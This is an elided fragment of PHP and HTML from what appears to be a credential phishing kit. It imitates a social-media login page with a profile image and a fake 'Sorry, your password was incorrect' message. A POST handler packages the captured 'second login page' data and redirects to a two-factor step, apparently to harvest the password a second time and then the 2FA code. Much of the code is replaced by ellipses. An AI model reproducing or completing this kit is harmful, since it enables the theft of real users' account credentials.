...
if($_POST){
    ...
    'text' => "İkinci Giriş Sayfası Bilgileri 
 ...
 <body bgcolor='black'>
 <font color='red'>  Script İkinci Sayfa Bilgileri  </font><br>
 ...
 echo '';
    ...
    header("Location: twofac.php?username=$username");
 }
...
<center>
   <img style="max-width:50%;  border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>">
           ...
           <center> <p class="metin" style="color: red;"> Sorry, your password was incorrect, <br> please double-check your password.</p>  </center>
<br>
          <!--SHuTTeRLooK-->
